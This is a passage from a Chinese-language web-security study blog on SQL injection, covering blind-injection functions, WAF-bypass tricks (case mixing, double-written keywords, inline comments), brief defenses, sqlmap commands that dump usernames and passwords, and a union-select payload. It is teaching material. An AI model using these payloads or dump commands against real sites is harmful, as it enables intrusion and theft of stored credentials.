页面没有真假状态<br>通常使用二分法对数据库名等信息进行长度、ascii码的探测<br>使用if(exp,sleep(),1)根据时间判断表达式是否正确</li></ul></li><li>根据提交方式的分类：<ul><li>GET型 可以直接在URL中修改参数进行测试</li><li>POST型 需要抓包进行参数修改</li></ul></li><li>一些特殊的注入：宽字节注入、二次注入<h2 id="04-sql注入常用的函数"><a href="#04-sql注入常用的函数" class="headerlink" title="04 sql注入常用的函数"></a>04 sql注入常用的函数</h2><ul><li>select user()查看当前用户名</li><li>select database()查看当前数据库</li><li>select version()查看当前版本</li><li>Limit m,n 从第m行开始到第m+n行（从0开始索引）</li><li>order by 获取字段数</li><li>length() 获取长度</li><li>ascii() 获取ascii码</li><li>substring(s,m,n),substr(),mid() 截取字符串<br>三个参数分别是截取的字符串，截取的起始位置(从1开始计数)，截取长度</li><li>floor(x) 返回不大于x的最大整数</li><li>round() 返回参数x最接近的整数</li><li>rand() 返回0-1之间的随机浮点数</li><li>load_file() 读取文件，并返回文件内容作为一个字符串</li><li>select … into outfile ‘绝对路径’ 写入文件</li><li>sleep(n) 延时n秒</li><li>benchmark(n,e) 执行e表达式n次，通过指定较大的n，实现延时</li><li>if(exp,t,f) 如果exp表达式为真就返回t，为假就返回f </li></ul></li></ol><h2 id="05-SQL注入绕过方式"><a href="#05-SQL注入绕过方式" class="headerlink" title="05 SQL注入绕过方式"></a>05 SQL注入绕过方式</h2><ol><li><p>大小写绕过，sql语句对大小写不敏感</p><p>如：AnD、ORdeR</p></li><li><p>使用&amp;&amp;、||替换and和or</p></li><li><p>双写绕过<br>如：un<del><strong>union</strong></del>ion</p></li><li><p>编码绕过</p><p>利用URL编码 或 十六进制编码</p></li><li><p>内联注释绕过<br>mysql中内联注释中的内容会被执行<br>如：/*!select*/ * from admin 可以正常执行</p></li><li><p>注释被过滤时，要闭合后边 </p></li></ol><h2 id="06-SQL注入的防御"><a href="#06-SQL注入的防御" class="headerlink" title="06 SQL注入的防御"></a>06 SQL注入的防御</h2><ol><li>对用户输入的值进行过滤</li><li>规范页面输出的错误提示</li><li>使用预编译</li><li>管理好数据库账号的权限</li><li>对数据库内敏感信息进行加密</li></ol><h2 id="07-利用sqlmap进行探测"><a href="#07-利用sqlmap进行探测" class="headerlink" title="07 利用sqlmap进行探测"></a>07 利用sqlmap进行探测</h2><ol><li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li><li>sqlmap -u url -D security –tables –batch<br>得到表有users</li><li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li><li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li></ol><h1 id="Mysql注入有关知识点"><a href="#Mysql注入有关知识点" class="headerlink" title="Mysql注入有关知识点"></a>Mysql注入有关知识点</h1><h2 id="01-Mysql-5-x数据结构"><a href="#01-Mysql-5-x数据结构" class="headerlink" title="01 Mysql 5.x数据结构"></a>01 Mysql 5.x数据结构</h2><p>在5.0以上版本中，默认定义了infomation数据库，用来存储数据库元信息。其中有表schemata（数据库名）、tables（表名）、columns（列名）</p><p>在schemata表中，schema_name字段用来存储数据库名</p><p>在tables表中，table_schema和table_name分别用来存储数据库名和表名</p><p>在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p><p><img src="/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/1.png" srcset="/img/loading.gif" alt></p><h2 id="02-SQL增删改查"><a href="#02-SQL增删改查" class="headerlink" title="02 SQL增删改查"></a>02 SQL增删改查</h2><p>Insert into values</p><p>delete from</p><p>Update set where</p><p>Select from where</p><h2 id="03-Mysql常用聚合函数"><a href="#03-Mysql常用聚合函数" class="headerlink" title="03 Mysql常用聚合函数"></a>03 Mysql常用聚合函数</h2><p>select user()查看当前用户名</p><p>select database()查看当前数据库</p><p>select version()查看当前版本</p><p>Limit m,n 从第m行开始到第m+n行（从0开始索引）</p><h2 id="04-注释"><a href="#04-注释" class="headerlink" title="04 注释"></a>04 注释</h2><p># </p><p>–➕空格       <strong>空格可能被过滤，可以用%20代替</strong></p><p>/**/</p><p>内联注释 ： /<em>!SQL语句\</em>/   只有Mysql可以识别，常用来绕过waf</p><p>如：select * from articles where id=id</p><p>使用内联注释注入 select *from articles where id=</p><p>-1 /*!union*//*!select*/ 1,2,3,4</p><p>在mysql中可以执行 union select 1,2,3,4</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
